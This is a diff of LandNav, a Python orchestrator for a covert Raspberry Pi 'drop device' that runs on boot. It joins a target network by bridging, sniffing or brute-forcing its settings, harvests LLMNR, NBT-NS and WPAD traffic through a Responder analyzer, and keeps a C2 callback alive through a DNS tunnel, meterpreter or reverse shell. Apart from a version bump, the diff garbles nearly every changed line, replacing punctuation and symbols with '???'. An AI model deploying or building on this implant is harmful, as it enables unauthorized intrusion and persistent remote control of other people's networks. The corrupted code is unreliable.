@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""LandNav — Automated rogue device network bootstrapper.
+"""LandNav ??? Automated rogue device network bootstrapper.
 
 Automates the entire lifecycle of a drop device deployment:
   1. Detect interfaces and deployment mode (bridge vs standalone)
@@ -7,11 +7,11 @@ Automates the entire lifecycle of a drop device deployment:
   3. Discover network configuration (DHCP, ARP, LLDP, brute force)
   4. Configure the Pi's network connectivity
   5. Start passive recon + Responder analyzer (continuous intelligence)
-  6. Establish C2 callback (DNS tunnel → meterpreter → reverse shell)
+  6. Establish C2 callback (DNS tunnel ??? meterpreter ??? reverse shell)
   7. Monitor and re-establish C2 on failure
 
 Designed for Raspberry Pi 4B running Kali Linux ARM.
-Deployed via systemd — runs automatically on boot.
+Deployed via systemd ??? runs automatically on boot.
 
 Usage:
     python3 landnav.py                  # Normal operation (boot mode)
@@ -20,7 +20,7 @@ Usage:
     python3 landnav.py --status         # Print current state and exit
 """
 
-VERSION = "0.3.2"
+VERSION = "0.3.3"
 
 import argparse
 import logging
@@ -44,7 +44,7 @@ from lib import egress
 from lib.passive import PassiveCollector
 from lib.responder import ResponderAnalyzer
 
-# ── Constants ───────────────────────────────────────────────────
+# ?????? Constants ?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
 
 DEFAULT_CONFIG = _HERE / "config.yaml"
 LOCK_FILE = Path("/var/run/landnav.pid")
@@ -55,7 +55,7 @@ log = logging.getLogger("landnav")
 _passive_collector = None
 _responder_analyzer = None
 
-# ── Logging Setup ───────────────────────────────────────────────
+# ?????? Logging Setup ?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
 
 def setup_logging(cfg):
     """Configure logging with file rotation and optional console output."""
@@ -85,7 +85,7 @@ def setup_logging(cfg):
         ch.setFormatter(fmt)
         root.addHandler(ch)
 
-# ── PID Lock ────────────────────────────────────────────────────
+# ?????? PID Lock ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
 
 def acquire_lock():
     if LOCK_FILE.exists():
@@ -103,32 +103,32 @@ def acquire_lock():
 def release_lock():
     LOCK_FILE.unlink(missing_ok=True)
 
-# ── Signal Handlers ─────────────────────────────────────────────
+# ?????? Signal Handlers ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
 
 _shutdown = False
 
 def _handle_signal(signum, frame):
     global _shutdown
-    log.info("Received signal %d — shutting down", signum)
+    log.info("Received signal %d ??? shutting down", signum)
     _shutdown = True
 
-# ── Phase 1: Interface Detection ───────────────────────────────
+# ?????? Phase 1: Interface Detection ?????????????????????????????????????????????????????????????????????????????????????????????
 
 def phase_detect_interfaces(cfg):
     """Detect ethernet interfaces and determine deployment mode.
 
     Performs a thorough review of existing networking before deciding:
-      1. Check for existing system-managed bridge → use it (bridge-reuse mode)
-      2. Check for USB-ethernet adapter → LandNav bridge mode
-      3. Single ethernet only → standalone mode
+      1. Check for existing system-managed bridge ??? use it (bridge-reuse mode)
+      2. Check for USB-ethernet adapter ??? LandNav bridge mode
+      3. Single ethernet only ??? standalone mode
 
     Returns:
         dict: mode ("bridge"|"bridge-reuse"|"standalone"),
               uplink, downstream, existing_bridge (bool)
     """
-    log.info("════════ Phase 1: Interface Detection ════════")
+    log.info("???????????????????????? Phase 1: Interface Detection ????????????????????????")
 
-    # ── Step 1: Check for existing system-managed bridge ───────
+    # ?????? Step 1: Check for existing system-managed bridge ?????????????????????
     # If br0 (or another bridge) already exists with connectivity,
     # LandNav should use it rather than destroying and recreating.
     if netconfig.interface_exists(bridge.BRIDGE_NAME):
@@ -140,7 +140,7 @@ def phase_detect_interfaces(cfg):
                  br_members, is_system)
 
         if is_system and br_info["ip"] and br_info["state"] == "UP":
-            log.info("System-managed bridge %s is UP with IP %s — using it directly",
+            log.info("System-managed bridge %s is UP with IP %s ??? using it directly",
                      bridge.BRIDGE_NAME, br_info["ip"])
             # Identify which member is the uplink (has carrier to the network)
             uplink = br_members[0] if br_members else None
@@ -151,7 +151,7 @@ def phase_detect_interfaces(cfg):
                 "existing_bridge": True,
             }
 
-    # ── Step 2: Detect physical ethernet interfaces ────────────
+    # ?????? Step 2: Detect physical ethernet interfaces ????????????????????????????????????
     ifaces = netconfig.detect_interfaces()
     log.info("Detected physical interfaces: %s", ifaces)
 
@@ -167,34 +167,34 @@ def phase_detect_interfaces(cfg):
     time.sleep(2)
 
     if not netconfig.interface_has_carrier(uplink):
-        log.warning("%s has no carrier — cable may not be connected", uplink)
-        # Continue anyway — cable might be connected after boot
+        log.warning("%s has no carrier ??? cable may not be connected", uplink)
+        # Continue anyway ??? cable might be connected after boot
 
     bridge_cfg = cfg.get("network", {}).get("bridge", {})
 
     if usb_eth and bridge_cfg.get("auto_detect", True):
-        log.info("USB-ethernet detected (%s) — BRIDGE mode", usb_eth)
+        log.info("USB-ethernet detected (%s) ??? BRIDGE mode", usb_eth)
         netconfig.set_interface_up(usb_eth)
         return {"mode": "bridge", "uplink": uplink, "downstream": usb_eth,
                 "existing_bridge": False}
     else:
-        log.info("No USB-ethernet — STANDALONE mode on %s", uplink)
+        log.info("No USB-ethernet ??? STANDALONE mode on %s", uplink)
         return {"mode": "standalone", "uplink": uplink, "downstream": None,
                 "existing_bridge": False}
 
-# ── Phase 2: Network Setup ─────────────────────────────────────
+# ?????? Phase 2: Network Setup ???????????????????????????????????????????????????????????????????????????????????????????????????????????????
 
 def phase_network_setup(iface_info, cfg):
     """Establish network connectivity.
 
-    Bridge-reuse: System bridge already working — read existing config.
+    Bridge-reuse: System bridge already working ??? read existing config.
     Bridge mode:  Create bridge, sniff legit device traffic, learn config.
-    Standalone:   DHCP → passive sniff → active probe → brute force.
+    Standalone:   DHCP ??? passive sniff ??? active probe ??? brute force.
 
     Returns:
         discovery.NetworkConfig on success, None on failure
     """
-    log.info("════════ Phase 2: Network Setup ════════")
+    log.info("???????????????????????? Phase 2: Network Setup ????????????????????????")
 
     net_cfg = cfg.get("network", {})
     disc_cfg = net_cfg.get("discovery", {})
@@ -259,10 +259,10 @@ def _setup_bridge_mode(uplink, downstream, net_cfg, disc_cfg):
     # Create the bridge
     led.set_state(led.BRIDGE_UP)
     if not bridge.create_bridge(uplink, downstream, stp=bridge_cfg.get("stp", False)):
-        log.error("Bridge creation failed — falling back to standalone")
+        log.error("Bridge creation failed ??? falling back to standalone")
         return _setup_standalone_mode(uplink, net_cfg, disc_cfg)
 
-    log.info("Bridge active — sniffing for legitimate device traffic")
+    log.info("Bridge active ??? sniffing for legitimate device traffic")
     led.set_state(led.DISCOVERY)
 
     # Learn the downstream device's MAC
@@ -277,7 +277,7 @@ def _setup_bridge_mode(uplink, downstream, net_cfg, disc_cfg):
 
     # If no DHCP, try ARP observation
     if not net_config.gateway:
-        log.info("No DHCP observed — trying ARP sniff")
+        log.info("No DHCP observed ??? trying ARP sniff")
         arp_config = discovery.sniff_arp(
             bridge.BRIDGE_NAME,
             timeout=disc_cfg.get("sniff_timeout", 60),
@@ -287,7 +287,7 @@ def _setup_bridge_mode(uplink, downstream, net_cfg, disc_cfg):
 
     # If still no gateway, try LLDP/CDP
     if not net_config.gateway:
-        log.info("No ARP data — trying LLDP/CDP")
+        log.info("No ARP data ??? trying LLDP/CDP")
         switch_info = discovery.sniff_lldp_cdp(bridge.BRIDGE_NAME, timeout=65)
         if switch_info.get("mgmt_ip"):
             log.info("Switch management IP: %s (VLAN: %s)",
@@ -301,14 +301,14 @@ def _setup_bridge_mode(uplink, downstream, net_cfg, disc_cfg):
 
     # Active probing as fallback
     if not net_config.gateway:
-        log.info("Passive sniffing failed — active ARP probing")
+        log.info("Passive sniffing failed ??? active ARP probing")
         probe_result = discovery.probe_for_gateway(bridge.BRIDGE_NAME)
         if probe_result:
             net_config = probe_result
 
     # Brute force as last resort
     if not net_config.gateway and disc_cfg.get("brute_force", True):
-        log.info("Active probing failed — brute force")
+        log.info("Active probing failed ??? brute force")
         bf_result = discovery.brute_force_subnet(
             bridge.BRIDGE_NAME,
             timeout=disc_cfg.get("brute_force_timeout", 1800),
@@ -363,7 +363,7 @@ def _setup_standalone_mode(uplink, net_cfg, disc_cfg):
     # Step 1: Check if we already have connectivity
     info = netconfig.get_interface_info(uplink)
     if info["ip"]:
-        log.info("Interface %s already has IP %s — checking connectivity", uplink, info["ip"])
+        log.info("Interface %s already has IP %s ??? checking connectivity", uplink, info["ip"])
         if netconfig.internet_reachable():
             config = discovery.NetworkConfig()
             config.ip = info["ip"]
@@ -394,7 +394,7 @@ def _setup_standalone_mode(uplink, net_cfg, disc_cfg):
     netconfig.release_dhcp(uplink)
 
     # Step 3: Passive sniff (ARP)
-    log.info("DHCP failed — passive ARP sniff")
+    log.info("DHCP failed ??? passive ARP sniff")
     # Need a temporary IP-less config to sniff
     netconfig.set_interface_up(uplink)
     netconfig.set_interface_promisc(uplink, True)
@@ -404,19 +404,19 @@ def _setup_standalone_mode(uplink, net_cfg, disc_cfg):
     # Extended sniff if needed
     if not net_config.gateway:
         ext = disc_cfg.get("sniff_extended", 300)
-        log.info("Short sniff failed — extended sniff (%ds)", ext)
+        log.info("Short sniff failed ??? extended sniff (%ds)", ext)
         net_config = discovery.sniff_arp(uplink, timeout=ext)
 
     # Step 4: Active ARP probing
     if not net_config.gateway:
-        log.info("Passive sniff failed — active ARP probing")
+        log.info("Passive sniff failed ??? active ARP probing")
         probe = discovery.probe_for_gateway(uplink)
         if probe:
             net_config = probe
 
     # Step 5: Brute force
     if not net_config.gateway and disc_cfg.get("brute_force", True):
-        log.info("Active probing failed — brute force")
+        log.info("Active probing failed ??? brute force")
         bf = discovery.brute_force_subnet(
             uplink, timeout=disc_cfg.get("brute_force_timeout", 1800),
         )
@@ -451,14 +451,14 @@ def _setup_standalone_mode(uplink, net_cfg, disc_cfg):
 
     return net_config
 
-# ── Phase 3: Network Validation ────────────────────────────────
+# ?????? Phase 3: Network Validation ????????????????????????????????????????????????????????????????????????????????????????????????
 
 def phase_validate_network(net_config, cfg):
     """Verify connectivity and discover services (DNS, proxy).
 
     Returns: True if network is usable, False otherwise
     """
-    log.info("════════ Phase 3: Network Validation ════════")
+    log.info("???????????????????????? Phase 3: Network Validation ????????????????????????")
 
     if not net_config or not net_config.ip:
         log.error("No network configuration to validate")
@@ -467,41 +467,41 @@ def phase_validate_network(net_config, cfg):
     # Layer 2: ARP the gateway
     if net_config.gateway:
         if netconfig.can_reach_gateway(net_config.gateway):
-            log.info("✓ Gateway %s reachable (Layer 2)", net_config.gateway)
+            log.info("??? Gateway %s reachable (Layer 2)", net_config.gateway)
         else:
-            log.warning("✗ Gateway %s unreachable via ARP", net_config.gateway)
+            log.warning("??? Gateway %s unreachable via ARP", net_config.gateway)
 
     # Layer 3: Ping the gateway
     if net_config.gateway:
         if netconfig.ping(net_config.gateway):
-            log.info("✓ Gateway %s responds to ping (Layer 3)", net_config.gateway)
+            log.info("??? Gateway %s responds to ping (Layer 3)", net_config.gateway)
         else:
-            log.warning("✗ Gateway %s does not respond to ping", net_config.gateway)
+            log.warning("??? Gateway %s does not respond to ping", net_config.gateway)
 
     # DNS: Discover and test servers
     net_cfg = cfg.get("network", {})
     fallback_dns = net_cfg.get("fallback_dns", ["8.8.8.8", "1.1.1.1"])
 
     if not net_config.dns_servers:
-        log.info("No DNS servers from discovery — searching")
+        log.info("No DNS servers from discovery ??? searching")
         net_config.dns_servers = discovery.discover_dns_servers(
             net_config.gateway, net_config,
         )
 
     if net_config.dns_servers:
-        log.info("✓ DNS servers: %s", net_config.dns_servers)
+        log.info("??? DNS servers: %s", net_config.dns_servers)
         netconfig.set_dns(net_config.dns_servers, net_config.domain)
     else:
-        log.warning("No local DNS found — using fallback: %s", fallback_dns)
+        log.warning("No local DNS found ??? using fallback: %s", fallback_dns)
         net_config.dns_servers = fallback_dns
         netconfig.set_dns(fallback_dns)
 
     # Test DNS resolution
     resolved = netconfig.dns_resolves(cfg["c2"]["host"])
     if resolved:
-        log.info("✓ DNS resolves %s → %s", cfg["c2"]["host"], resolved)
+        log.info("??? DNS resolves %s ??? %s", cfg["c2"]["host"], resolved)
     else:
-        log.warning("✗ Cannot resolve %s — C2 may need IP fallback", cfg["c2"]["host"])
+        log.warning("??? Cannot resolve %s ??? C2 may need IP fallback", cfg["c2"]["host"])
 
     # Proxy detection
     proxy_cfg = net_cfg.get("proxy", {})
@@ -515,25 +515,25 @@ def phase_validate_network(net_config, cfg):
         if proxy_host:
             net_config.proxy_host = proxy_host
             net_config.proxy_port = proxy_port
-            log.info("✓ Proxy detected: %s:%d", proxy_host, proxy_port)
+            log.info("??? Proxy detected: %s:%d", proxy_host, proxy_port)
         else:
             log.info("No proxy detected")
 
     # Internet connectivity
     if netconfig.internet_reachable():
-        log.info("✓ Internet reachable")
+        log.info("??? Internet reachable")
     else:
-        log.info("✗ Internet not reachable — C2 will use internal routes / DNS tunnel")
+        log.info("??? Internet not reachable ??? C2 will use internal routes / DNS tunnel")
 
     led.set_state(led.NETWORK_UP)
     return True
 
-# ── Passive Recon Launch ───────────────────────────────────────
+# ?????? Passive Recon Launch ?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
 
 def start_passive_recon(iface_info, cfg):
     """Start passive network intelligence collection and Responder analyzer.
 
-    Runs as background daemon threads — collects ARP, DNS, DHCP, NetBIOS,
+    Runs as background daemon threads ??? collects ARP, DNS, DHCP, NetBIOS,
     LLMNR, mDNS, SSDP traffic plus Responder analyze-mode output.
     Continues running for the entire lifetime of the deployment.
 
@@ -557,7 +557,7 @@ def start_passive_recon(iface_info, cfg):
     recon_dir = Path(cfg.get("logging", {}).get(
         "directory", "/opt/pr0t31n/landnav/logs")) / "recon"
 
-    log.info("════════ Passive Recon: Starting ════════")
+    log.info("???????????????????????? Passive Recon: Starting ????????????????????????")
 
     # Start passive packet collector
     flush_interval = passive_cfg.get("flush_interval", 30)
@@ -581,7 +581,7 @@ def start_passive_recon(iface_info, cfg):
         if _responder_analyzer.start():
             log.info("Responder analyzer started on %s", sniff_iface)
         else:
-            log.warning("Responder analyzer failed to start — continuing without it")
+            log.warning("Responder analyzer failed to start ??? continuing without it")
             _responder_analyzer = None
     else:
         log.info("Responder analyzer disabled in config")
@@ -605,14 +605,14 @@ def stop_passive_recon():
         _passive_collector.stop()
         _passive_collector = None
 
-# ── Phase 4: C2 Egress ─────────────────────────────────────────
+# ?????? Phase 4: C2 Egress ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
 
 def phase_c2_egress(net_config, cfg):
     """Establish C2 callback.
 
     Returns: str method name on success, None on failure
     """
-    log.info("════════ Phase 4: C2 Egress Cascade ════════")
+    log.info("???????????????????????? Phase 4: C2 Egress Cascade ????????????????????????")
     led.set_state(led.C2_ATTEMPT)
 
     # Inject detected proxy into config for egress module
@@ -623,7 +623,7 @@ def phase_c2_egress(net_config, cfg):
     method = egress.run_cascade(cfg)
 
     if method:
-        log.info("════════ C2 ESTABLISHED via %s ════════", method)
+        log.info("???????????????????????? C2 ESTABLISHED via %s ????????????????????????", method)
         led.set_state(led.C2_CONNECTED)
 
         # Log passive recon status for operator awareness
@@ -632,20 +632,20 @@ def phase_c2_egress(net_config, cfg):
                      _passive_collector.get_host_count(),
                      len(_passive_collector.get_targets()))
         if _responder_analyzer and _responder_analyzer.is_running():
-            log.info("Responder analyzer active — LLMNR/NBT-NS/WPAD intelligence collecting")
+            log.info("Responder analyzer active ??? LLMNR/NBT-NS/WPAD intelligence collecting")
     else:
-        log.error("════════ C2 FAILED — all methods exhausted ════════")
+        log.error("???????????????????????? C2 FAILED ??? all methods exhausted ????????????????????????")
         led.set_state(led.ERROR)
 
     return method
 
-# ── Main ────────────────────────────────────────────────────────
+# ?????? Main ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
 
 def main():
     global _shutdown
 
     parser = argparse.ArgumentParser(
-        description="LandNav v%s — Rogue device network bootstrapper" % VERSION,
+        description="LandNav v%s ??? Rogue device network bootstrapper" % VERSION,
     )
     parser.add_argument("--config", "-c", default=str(DEFAULT_CONFIG),
                         help="Path to config.yaml")
@@ -702,18 +702,18 @@ def main():
     led.set_state(led.BOOTING)
 
     try:
-        # ── Phase 1: Interface Detection ────────────────────
+        # ?????? Phase 1: Interface Detection ????????????????????????????????????????????????????????????
         iface_info = phase_detect_interfaces(cfg)
         if not iface_info:
-            log.error("No usable network interface — aborting")
+            log.error("No usable network interface ??? aborting")
             led.set_state(led.ERROR)
             time.sleep(30)
             sys.exit(1)
 
-        # ── Phase 2: Network Setup ──────────────────────────
+        # ?????? Phase 2: Network Setup ??????????????????????????????????????????????????????????????????????????????
         net_config = phase_network_setup(iface_info, cfg)
         if not net_config:
-            log.error("Network setup failed — aborting")
+            log.error("Network setup failed ??? aborting")
             led.set_state(led.ERROR)
             time.sleep(30)
             sys.exit(1)
@@ -722,21 +722,21 @@ def main():
                  net_config.ip, net_config.cidr, net_config.gateway,
                  net_config.dns_servers, net_config.discovery_method)
 
-        # ── Phase 3: Validation ─────────────────────────────
+        # ?????? Phase 3: Validation ???????????????????????????????????????????????????????????????????????????????????????
         phase_validate_network(net_config, cfg)
 
-        # ── Start passive recon (runs continuously) ─────────
+        # ?????? Start passive recon (runs continuously) ???????????????????????????
         start_passive_recon(iface_info, cfg)
 
-        # ── Phase 4: C2 Egress ──────────────────────────────
+        # ?????? Phase 4: C2 Egress ??????????????????????????????????????????????????????????????????????????????????????????
         retry_interval = cfg["c2"].get("retry_interval", 60)
 
         while not _shutdown:
             method = phase_c2_egress(net_config, cfg)
 
             if method:
-                # C2 connected — start watchdog and wait
-                log.info("C2 active — starting watchdog")
+                # C2 connected ??? start watchdog and wait
+                log.info("C2 active ??? starting watchdog")
                 egress.start_watchdog(cfg, on_reconnect=lambda m: led.set_state(led.C2_CONNECTED))
 
                 # Block until shutdown signal
@@ -744,7 +744,7 @@ def main():
                     time.sleep(5)
                     # If C2 dropped and watchdog couldn't recover, re-enter cascade
                     if egress._current_state == egress.EgressState.FAILED:
-                        log.warning("Watchdog reports C2 failed — re-entering cascade")
+                        log.warning("Watchdog reports C2 failed ??? re-entering cascade")
                         led.set_state(led.C2_ATTEMPT)
                         break
 
@@ -753,7 +753,7 @@ def main():
                 if _shutdown:
                     break
             else:
-                # All methods failed — wait and retry
+                # All methods failed ??? wait and retry
                 log.info("Retrying C2 cascade in %ds", retry_interval)
                 led.set_state(led.ERROR)
 
@@ -775,7 +775,7 @@ def main():
         time.sleep(3)
         led.stop()
 
-        # Cleanup bridge — destroy_bridge() is safe: it checks the marker
+        # Cleanup bridge ??? destroy_bridge() is safe: it checks the marker
         # file and refuses to touch system-managed or non-LandNav bridges.
         bridge.destroy_bridge()
 
